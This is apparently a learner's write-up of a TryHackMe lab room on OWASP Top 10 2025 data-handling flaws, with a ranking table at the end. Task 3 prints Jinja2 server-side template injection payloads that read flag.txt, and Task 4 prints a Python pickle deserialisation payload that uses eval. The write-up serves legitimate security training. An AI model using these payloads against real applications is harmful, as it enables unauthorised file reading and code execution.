<h1 align="center">OWASP Top 10 2025: Insecure Data Handling</h1>
<p align="center">2025, November 18  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>1</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Learn about A04, A05, and A08 as they related to insecure data handling. &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/owasptopten2025three">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/b5fc9474-f596-478c-835d-da72f3e8b04b"></p>


<h2>Task 1 . Introduction</h2>
<p>This room will introduce you to 3 elements of the OWASP Top 10 list (2025). In this room, you will learn about the elements relating to application behaviour and user input. We will cover these vulnerabilities briefly, how to prevent them, and finally, you will practice exploiting these vulnerabilities:<br>
  
- A04: Cryptographic Failures<br>
- A05: Injection<br>
- A08: Software or Data Integrity Failures<br>

<h3>Deploy Practical</h3>
<p>Before we begin, please deploy the practical VM by clicking the green "Start Machine" button below. Please note that you will need to use either the TryHackMe AttackBox or your own hacking machine connected to the TryHackMe VPN to access each practical.</p>

<h3>Your virtual environment has been set up</h3>
<p>All machine details can be found at the top of the page.</p>

<p><em>Answer the question below</em></p>

<p>1.1. <em>I´m ready!</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . A04: Cryptographic Failures</h2>

<p><em>Answer the question below</em></p>

<p>2.1. <em>Decrypt the encrypted notes. One of them will contain a flag value. What is it?</em> Hint: The first three characters of the key are given to you on the web application. Make a guess as to what the 4th character can be (digit) to unlock all of the encrypted notes.<br>
<code>THM{••••••••••••••••</code></p>

<h6 align="center"><img width="600px" src="https://github.com/user-attachments/assets/eb51cf3b-55d1-4dbf-adbc-793aff033162"><br>
                   <img width="600px" src="https://github.com/user-attachments/assets/22e8c409-53f2-435b-a304-9347f9289f07"><br><br>
                   <img width="600px" src="https://github.com/user-attachments/assets/21f22f7d-9e33-45c8-b76c-4c5522d861e0"></h6>


<br>
<h2>Task 3 . A05: Injection</h2>

<p><em>Answer the question below</em></p>

<p>3.1. <em>Perform an SSTI attack on the practical. You need to read the contents of flag.txt that is located within the same directory as the web application.</em><br>
<code>THM{••••••••••••••••••}</code></p>

```bash
{{ 9 * 9 }}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/b6475411-6b02-4e26-b884-e7376bf5eae6"></h6>

<br>

```bash
{{ config.items() }}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/2ed8309e-4655-4d55-b99c-668574610418"></h6>

<br>

```bash
{{ request.__dict__ }}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/0197985f-27fd-4379-80bb-7bb4f7109fa9"></h6>

<br>

```bash
{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/79f747b2-18bf-4ccd-912c-71cccc15e381"></h6>

<br>
<h2>Task 4 . A08: Software or Data Integrity Failures</h2>

<p><em>Answer the question below</em></p>

<p>4.1. <em>What are the contents of flag.txt?</em> Hint: You will need to use Python to generate a malicious, serialised payload to submit to the web application. The script has been provided to you within the web application.<br>
<code>THM{••••••••••••••••••••••••}</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/16bfb0e3-5cff-414d-9201-e1b5d0658d68"></h6>

```bash
:~# nano script.py
```

```bash
:~# cat script.py
import pickle
import base64

class Malicious:
    def __reduce__(self):
        # Return a tuple: (callable, args)
        # This will execute: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)

# Copy the output and paste it into the form
```

```bash
:~# python3 script.py
gASVMwAAAAAAAACMCGJ1aWx0a...
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/619ea974-e73b-429e-a3fe-fa67d157865a"></h6>

<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/07d91c46-1923-456c-a6fe-a48a38d24ce3"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/ac2ad8d7-ee03-4a10-b965-0e8a8f481b92"></p>


<h1 align="center">My TryHackMe Journey ・ 2025, November</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|18      |Easy 🔗 - OWASP Top 10 2025: Insecure Data Handling| 1        |      93ʳᵈ    |     3ʳᵈ    |     894ᵗʰ   |      8ᵗʰ     |    132,207  |    1,024    |    80     |
|18      |Easy 🔗 - OWASP Top 10 2025: Application Design Failures| 1   |      93ʳᵈ    |     3ʳᵈ    |     927ᵗʰ   |      8ᵗʰ     |    132,183  |    1,023    |    80     |
|18      |Easy 🔗 - OWASP Top 10 2025: IAAA Failures| 1   |      93ʳᵈ    |     3ʳᵈ    |     971ˢᵗ   |      8ᵗʰ     |    132,151  |    1,022    |    80     |
|14      |Hard 🚩 - Shock and Silence            |   1    |      94ᵗʰ    |     4ᵗʰ    |     749ᵗʰ   |      7ᵗʰ     |    133,095  |    1,021    |    80     |
|14      |Easy 🔗 - Input Manipulation & Prompt Injection| 1 |   95ᵗʰ    |     4ᵗʰ    |   1,290ᵗʰ   |     12ⁿᵈ     |    132,822  |    1,020    |    80     |
|14      |Hard 🚩 - CRM Snatch                   |   1    |      95ᵗʰ    |     4ᵗʰ    |   1,526ᵗʰ   |     12ⁿᵈ     |          -  |    1,019    |    80     |
|8       |Easy 🔗 - Living of the Land Attacks   |   1    |      91ˢᵗ    |     4ᵗʰ    |   1,759ᵗʰ   |     17ᵗʰ     |    132,642  |    1,018    |    80     |
|8       |Hard 🚩 - Lost in RAMslation           |   1    |      91ˢᵗ    |     4ᵗʰ    |   2,547ᵗʰ   |     25ᵗʰ     |    132,580  |    1,017    |    80     |
|8       |Easy 🔗 - MITRE                        |   1    |       -      |     4ᵗʰ    |      -      |      -       |          -  |       -     |    80     |

</h6></div><br>

<p align="center">Global All Time:     93ʳᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/ab8f8448-9fd6-4f44-a4c7-09392e714ebc"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/29327c5f-b842-49c4-b6d2-26df66f4ef22"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/b9d1a28b-42f0-41a3-bba1-17e9ea20d616"><br><br>
                  Global monthly:     894ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/06c42500-fda7-4e34-b60e-92bf22070d26"><br><br>
                  Brazil monthly:       8ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7f7542d7-4cd6-4316-a142-a0c1c0e30b9a"></p>


<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>


